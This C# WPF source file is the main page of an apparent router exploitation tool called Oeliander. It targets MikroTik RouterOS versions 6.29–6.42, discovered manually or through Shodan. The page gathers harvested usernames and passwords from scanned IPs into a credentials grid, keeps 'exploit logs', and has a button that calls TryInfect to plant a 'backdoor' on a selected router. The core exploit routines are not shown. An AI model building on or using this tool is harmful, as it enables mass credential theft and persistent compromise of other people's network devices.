﻿using System.Collections.ObjectModel;
using System.ComponentModel;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Controls;

using OelianderUI.Contracts.Views;
using OelianderUI.Core.Contracts.Services;
using OelianderUI.Core.Models;
using OelianderUI.Helpers;
using Microsoft.Win32;
using System.Windows.Markup;
using System.Diagnostics;
using System.Windows;
using ControlzEx.Standard;

namespace OelianderUI.Views;

public partial class MainPage : Page, INotifyPropertyChanged, INavigationAware
{
    #region locals

    public ScanHelper helperObject { get; set; }
    internal static bool ShodanScan = false;
    internal static string _targetingString = "";
    public ObservableCollection<ScanResult> Source { get; } = new();
    public List<string> collectedCredentials = new();
    public List<string> rosVersion = new();
    public static Dictionary<Helpers.User, string> _staticList = new();
    public bool SaveShodanOnly = false; 
    private static int _tabulation = 0; 
    internal static Settings settings = new();
    public static List<CollectionListing> _collectionList = new();
    private readonly ReaderWriterLockSlim _readWriteLock = new();

    #endregion locals

    public void AddLog(string text)
    {
        try
        {
            Dispatcher.Invoke(() =>
            {
                LogBox.AppendText(text + Environment.NewLine);
            });
        }
        catch (Exception E)
        {
            helperObject.HandleException(E);
        }
    }
    public void AddToLogFile(string text)
    {
        if (!File.Exists("Oeliander.log")) { File.Create("Oeliander.log"); }
        Thread.Sleep(1000);
        _readWriteLock.EnterWriteLock();
        try
        {
            var resultPath = Directory.GetCurrentDirectory() + "\\Oeilander.log";
            using StreamWriter st = File.AppendText(resultPath);
            st.WriteLine(text);
        }
        finally
        {
            _readWriteLock.ExitWriteLock();
        }
    }
    public void AddLog(string text, object obj)
    {
        try
        {
            Dispatcher.Invoke(() =>
            {
                LogBox.AppendText(text + Environment.NewLine);
            });
        }
        catch (Exception E)
        {
            helperObject.HandleException(E);
        }
    }
    public MainPage() //IScanResultService scanResultService)
    {
        //_scanResults = scanResultService;
        InitializeComponent();
        DataContext = this;
        helperObject = new ScanHelper(AddLog, false, this) { debugMod = false };
    }
    public void ScanStop()
    {
        Dispatcher.Invoke(() =>
        {
            StartScanButton.Content = "Start";
            AddLog(Environment.NewLine + helperObject.GetTime() + ": Scan stopped successfully\n");
            AddToLogFile("\n\n\t[*] End of Scan: " + helperObject.GetTime() + "\n\n###############################################################################\n\n");
        });
    }
    public void FillList()
    {
        Dispatcher.Invoke(() =>
        {
            userGrid.ItemsSource = null;
            userGrid.ItemsSource = _collectionList;
            userGrid.Items.Refresh();
        });
    }
    public void FillList(List<CollectionListing> _connections)
    {
        foreach (var item in _connections)
           Dispatcher.Invoke(() => { userGrid.Items.Add(item); });
    }
    public void AddCred(Helpers.User _uList, string _ip, bool status = false)
    {
        try
        {
            _tabulation++;
            _collectionList.Add(new CollectionListing()
            {
                Index = _tabulation,
                Username = _uList.Username,
                Password = _uList.Password,
                IPAddress = _ip,
                Status = status ? "Authenticated" : "Unauthenticated"
            });
            Console.Write(_collectionList.ToList());
            var _finalList = _collectionList.Distinct().ToList();
            Console.Write(_finalList);
            Console.WriteLine();
            FillList();
//            FillList(_finalList);
        }
        catch (Exception E)
        {
            helperObject.HandleException(E);
        }
    }
    public void AddCred(List<Helpers.User> _uList, string _ip, string status = "Unauthenticated")
    {
        try
        {
            foreach (Helpers.User _collected in _uList)
            {
                _tabulation++;
                _collectionList.Add(new CollectionListing()
                {
                    Index = _tabulation,
                    Username = _collected.Username,
                    Password = _collected.Password,
                    IPAddress = _ip,
                    Status = status
                });
            }
            Console.Write(_collectionList.ToList());
            List<CollectionListing> _finalList = _collectionList.Distinct().ToList();
            Console.Write(_finalList);
            Console.WriteLine();
            FillList();
            //FillList(_finalList);
            //Dispatcher.Invoke(() =>
            //{
            //    userGrid.ItemsSource = null;
            //    userGrid.ItemsSource = _collectionList;
            //    userGrid.Items.Refresh();
            //});
        }
        catch (Exception E)
        {
            helperObject.HandleException(E);
        }
    }

    public async void OnNavigatedTo(object parameter)
    {
#if DEBUG
        if (_collectionList.Count == 0)
        {        
            _collectionList.Add(new CollectionListing()
            {
                Index = 1,
                Username = "admin",
                Password = "password",
                IPAddress = "127.0.0.1",
                Status = "Unauthenticated"
            });
        }
#endif
        FillList();
    }

    public void OnNavigatedFrom()
    {
    }

    public event PropertyChangedEventHandler PropertyChanged;

    private void Set<T>(ref T storage, T value, [CallerMemberName] string propertyName = null)
    {
        if (Equals(storage, value))
        {
            return;
        }

        storage = value;
        OnPropertyChanged(propertyName);
    }

    private void OnPropertyChanged(string propertyName) => PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(propertyName));

    private void ManualScanButton_Checked(object sender, System.Windows.RoutedEventArgs e)
    {
        if (ShodanScan == true)
        {
            ShodanScan = false;
            targetLabel.Text = "Target(s)";
            fileSelect.IsEnabled = true;
        }
        //else
        //{
        //    ShodanScan = true;
        //    routerVersion.Visibility = System.Windows.Visibility.Visible;
        //    ROSTextBlock.Visibility = System.Windows.Visibility.Visible;
        //    TargetTextBox.IsEnabled = false;
        //}
    }

    private void ShodanScanButton_Checked(object sender, System.Windows.RoutedEventArgs e)
    {
        if (ShodanScan == false)
        {
            ShodanScan = true;
            targetLabel.Text = "Router Version: (Affected Versions: 6.29-6.42)";
            fileSelect.IsEnabled = false;
        }
        //else
        //{
        //    ShodanScan = false;
        //    routerVersion.Visibility = System.Windows.Visibility.Hidden;
        //    ROSTextBlock.Visibility = System.Windows.Visibility.Hidden;
        //    TargetTextBox.IsEnabled = true;
        //}
    }

    private void fileSelect_Click(object sender, System.Windows.RoutedEventArgs e)
    {
        var op = new OpenFileDialog();
        op.RestoreDirectory = true;
        op.ShowDialog();
        TargetTextBox.Text = op.FileName;
        _targetingString = Path.GetFileName(op.FileName);
    }
    private void GetLogs(object sender, RoutedEventArgs e)
    {
        Process.Start("explorer", "Oeliander.log");
    }
    private void CheckResults(object sender, RoutedEventArgs e)
    {
        Process.Start("explorer", ".\\Results");
    }
    private void ClearLogs(object sender, RoutedEventArgs e)
    {
        File.WriteAllText("Oeliander.log", "Oeliander Exploit Logs\n--------------------------------\n\n");
    }

    private void StartScan(object sender, System.Windows.RoutedEventArgs e)
    {
        if (StartScanButton.Content.ToString() == "Start")
        {
            helperObject.SaveScanTime();
            GC.Collect();
            GC.WaitForPendingFinalizers();
            if (ShodanScan)
                helperObject.Start(ShodanScan, TargetTextBox.Text);
            else
            {
                if (_targetingString == "")
                    helperObject.Start(ShodanScan, TargetTextBox.Text);
                else
                    helperObject.Start(ShodanScan, _targetingString);
            }
        }
        else if (StartScanButton.Content.ToString() == "Stop")
        {
            helperObject.Stop();
        }
    }

    private static User userForBtw;
    private static string targetForBTW = "";
    private void userGrid_SelectedCellsChanged(object sender, SelectedCellsChangedEventArgs e)
    {
        if (userGrid.CurrentItem != null)
        {
            CollectionListing selectedItem = (CollectionListing)userGrid.CurrentItem;
            if (selectedItem != null)
            {
                targetForBTW = selectedItem.IPAddress;
                userForBtw = new User(selectedItem.Username, selectedItem.Password);
            }
        }
    }

    private void AttemptBTW(object sender, System.Windows.RoutedEventArgs e)
    {
        helperObject.TryInfect(targetForBTW, userForBtw, "backdoor");
    }
}
